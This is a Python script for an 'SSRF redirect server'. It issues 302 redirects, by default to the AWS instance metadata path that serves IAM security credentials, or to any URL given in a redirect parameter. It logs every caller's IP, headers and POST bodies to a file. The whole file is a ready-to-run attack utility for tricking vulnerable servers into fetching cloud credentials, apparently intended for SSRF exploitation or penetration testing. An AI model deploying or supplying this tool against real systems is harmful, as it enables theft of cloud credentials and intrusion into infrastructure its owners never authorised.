#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from datetime import datetime
import os, sys

# ─── CONFIG ───────────────────────────────────────────────────────────────────
# Dokploy / containers set PORT; unprivileged default avoids needing root for :80
PORT        = int(os.environ.get("PORT", "8000"))
DEFAULT_URL = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
LOG_FILE    = "redirect_log.txt"
# ──────────────────────────────────────────────────────────────────────────────

class RedirectHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        timestamp  = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        client_ip  = self.client_address[0]
        user_agent = self.headers.get("User-Agent", "none")
        referer    = self.headers.get("Referer", "none")
        full_url   = self.path

        # Parse ?redirect= param
        parsed   = urlparse(self.path)
        params   = parse_qs(parsed.query)
        dest_url = params.get("redirect", [DEFAULT_URL])[0]

        # Build log entry
        log_entry = f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[{timestamp}]
  FROM       : {client_ip}
  REQUEST    : {full_url}
  REDIRECTING: {dest_url}
  USER-AGENT : {user_agent}
  REFERER    : {referer}
  ALL HEADERS:
"""
        for key, val in self.headers.items():
            log_entry += f"    {key}: {val}\n"

        log_entry += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"

        # Print to terminal
        print(log_entry, flush=True)

        # Write to log file
        with open(LOG_FILE, "a") as f:
            f.write(log_entry)

        # Send redirect
        self.send_response(302)
        self.send_header("Location", dest_url)
        self.end_headers()

    def do_POST(self):
        # Log POST bodies too — useful if anything POSTs back
        timestamp   = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        client_ip   = self.client_address[0]
        length      = int(self.headers.get("Content-Length", 0))
        body        = self.rfile.read(length).decode("utf-8", errors="replace") if length else ""

        log_entry = f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[{timestamp}] POST RECEIVED
  FROM : {client_ip}
  PATH : {self.path}
  BODY : {body}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
        print(log_entry, flush=True)
        with open(LOG_FILE, "a") as f:
            f.write(log_entry)

        self.send_response(200)
        self.end_headers()

    def log_message(self, format, *args):
        pass  # Suppress default httpserver noise — we handle logging ourselves


if __name__ == "__main__":
    print(f"""
╔══════════════════════════════════════════════════════╗
║           SSRF REDIRECT SERVER — READY               ║
╠══════════════════════════════════════════════════════╣
║  Port     : {PORT:<42}║
║  Log file : {LOG_FILE:<42}║
║  Default  : {DEFAULT_URL[:42]:<42}║
╠══════════════════════════════════════════════════════╣
║  Usage:                                              ║
║  http://YOUR_IP/?redirect=http://169.254.169.254/... ║
║  http://YOUR_IP/          ← uses default URL above   ║
╚══════════════════════════════════════════════════════╝
""")

    server = HTTPServer(("0.0.0.0", PORT), RedirectHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] Server stopped.")
        sys.exit(0)
